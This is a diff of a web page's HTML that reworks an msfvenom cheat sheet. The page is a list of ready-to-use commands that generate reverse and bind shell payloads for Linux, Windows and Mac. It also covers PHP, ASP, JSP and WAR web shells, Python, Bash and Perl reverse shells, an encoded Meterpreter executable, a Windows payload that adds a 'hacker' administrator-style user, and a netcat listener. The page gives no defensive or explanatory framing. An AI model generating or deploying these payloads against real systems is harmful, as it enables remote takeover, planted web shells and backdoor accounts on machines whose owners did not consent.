@@ -188,62 +188,81 @@ function sidebar_toggle() {
         <div class="book-content">
           <div class="book-post">
   <h1 id="MSFVenom-Cheat-Sheet">MSFVenom Cheat Sheet</h1>
-<h3 id="Metasploit-Handler">Metasploit Handler</h3>
-<pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler
+<h3 id="Handler">Handler</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Metasploit Handler</span>
+use exploit/multi/handler
 <span class="token builtin class-name">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
 <span class="token builtin class-name">set</span> RHOST <span class="token operator">&lt;</span>Remote IP<span class="token operator">></span>
 <span class="token builtin class-name">set</span> LHOST <span class="token operator">&lt;</span>Local IP<span class="token operator">></span>
 <span class="token builtin class-name">set</span> LPORT <span class="token operator">&lt;</span>Local Port<span class="token operator">></span>
-run</code></pre>
+run
+<span class="token comment"># Shell Handler</span>
+<span class="token function">nc</span> -lnvp <span class="token operator">&lt;</span>Local IP<span class="token operator">></span></code></pre>
 <h2 id="0x01-Binaries-Payloads">0x01 Binaries Payloads</h2>
 <h3 id="1、Linux">1、Linux</h3>
-<p>Linux Meterpreter Reverse Shell<br>
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf &gt; shell.elf</p>
-<p>Linux Bind Meterpreter Shell<br>
-msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf &gt; bind.elf</p>
-<p>Linux Bind Shell<br>
-msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf &gt; term.elf</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Linux Meterpreter Reverse Shell</span>
+msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf
+
+<span class="token comment"># Linux Bind Meterpreter Shell</span>
+msfvenom -p linux/x86/meterpreter/bind_tcp <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Remote IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f elf <span class="token operator">></span> bind.elf
+
+<span class="token comment"># Linux Bind Shell</span>
+msfvenom -p generic/shell_bind_tcp <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Remote IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f elf <span class="token operator">></span> term.elf</code></pre>
 <h3 id="2、Windows">2、Windows</h3>
-<p>Windows Meterpreter Reverse TCP Shell<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe &gt; shell.exe</p>
-<p>Windows Reverse TCP Shell<br>
-msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe &gt; shell.exe</p>
-<p>Windows Encoded Meterpreter Windows Reverse Shell<br>
-msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe</p>
-<p>Windows Create User<br>
-msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Windows Meterpreter Reverse TCP Shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f exe <span class="token operator">></span> shell.exe
+
+<span class="token comment"># Windows Reverse TCP Shell</span>
+msfvenom -p windows/shell/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f exe <span class="token operator">></span> shell.exe
+
+<span class="token comment"># Windows Encoded Meterpreter Windows Reverse Shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i <span class="token number">3</span> -f exe <span class="token operator">></span> encoded.exe
+
+<span class="token comment"># Windows Create User</span>
+msfvenom -p windows/adduser <span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>hacker <span class="token assign-left variable">PASS</span><span class="token operator">=</span>Hacker123$ -f exe <span class="token operator">></span> adduser.exe</code></pre>
 <h3 id="3、Mac">3、Mac</h3>
-<p>Mac Reverse Shell<br>
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho &gt; shell.macho</p>
-<p>Mac Bind Shell<br>
-msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f macho &gt; bind.macho</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Mac Reverse Shell</span>
+msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f macho <span class="token operator">></span> shell.macho
+
+<span class="token comment"># Mac Bind Shell</span>
+msfvenom -p osx/x86/shell_bind_tcp <span class="token assign-left variable">RHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Remote IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f macho <span class="token operator">></span> bind.macho</code></pre>
 <h2 id="0x02-Web-Payloads">0x02 Web Payloads</h2>
-<p>PHP Meterpreter Reverse TCP<br>
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; shell.php<br>
-cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
-<p>ASP Meterpreter Reverse TCP<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp &gt; shell.asp</p>
-<p>JSP Java Meterpreter Reverse TCP<br>
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; shell.jsp</p>
-<p>WAR<br>
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war &gt; shell.war</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PHP Meterpreter Reverse TCP</span>
+msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f raw <span class="token operator">></span> shell.php
+<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> ‘<span class="token operator">&lt;</span>?php ‘ <span class="token operator">|</span> <span class="token function">tr</span> -d ‘<span class="token punctuation">\</span>n’ <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php
+
+<span class="token comment"># ASP Meterpreter Reverse TCP</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f asp <span class="token operator">></span> shell.asp
+
+<span class="token comment"># JSP Java Meterpreter Reverse TCP</span>
+msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f raw <span class="token operator">></span> shell.jsp
+
+<span class="token comment"># WAR</span>
+msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f war <span class="token operator">></span> shell.war</code></pre>
 <h2 id="0x03-Scripting-Payloads">0x03 Scripting Payloads</h2>
-<p>Python Reverse Shell<br>
-msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.py">shell.py</a></p>
-<p>Bash Unix Reverse Shell<br>
-msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.sh">shell.sh</a></p>
-<p>Perl Unix Reverse shell<br>
-msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.pl">shell.pl</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python Reverse Shell</span>
+msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f raw <span class="token operator">></span> shell.py
+
+<span class="token comment"># Bash Unix Reverse Shell</span>
+msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f raw <span class="token operator">></span> shell.sh
+
+<span class="token comment"># Perl Unix Reverse shell</span>
+msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f raw <span class="token operator">></span> shell.pl</code></pre>
 <h2 id="0x04-Shellcode">0x04 Shellcode</h2>
 <h3 id="1、Linux-v2">1、Linux</h3>
-<p>Linux Meterpreter Reverse TCP Shellcode<br>
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Linux Shell Reverse TCP Shellcode（x86）</span>
+msfvenom -a x86 --platform linux -p generic/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -b <span class="token operator">&lt;</span>Badchars e.g:<span class="token string">"<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x20">\x20</span>"</span><span class="token operator">></span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -f <span class="token operator">&lt;</span>language<span class="token operator">></span>
+
+<span class="token comment"># Linux Meterpreter Reverse TCP Shellcode（x86）</span>
+msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span></code></pre>
 <h3 id="2、Windows-v2">2、Windows</h3>
-<p>Windows Meterpreter Reverse TCP Shellcode<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Windows Shell Reverse TCP Shellcode</span>
+msfvenom -p windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span> <span class="token assign-left variable">EXITFUNC</span><span class="token operator">=</span>thread -f <span class="token operator">&lt;</span>language<span class="token operator">></span>
+<span class="token comment"># Windows Meterpreter Reverse TCP Shellcode</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span></code></pre>
 <h3 id="3、Mac-v2">3、Mac</h3>
-<p>Mac Reverse TCP Shellcode<br>
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Mac Reverse TCP Shellcode</span>
+msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Local Port<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span></code></pre>
 
 </div>
 
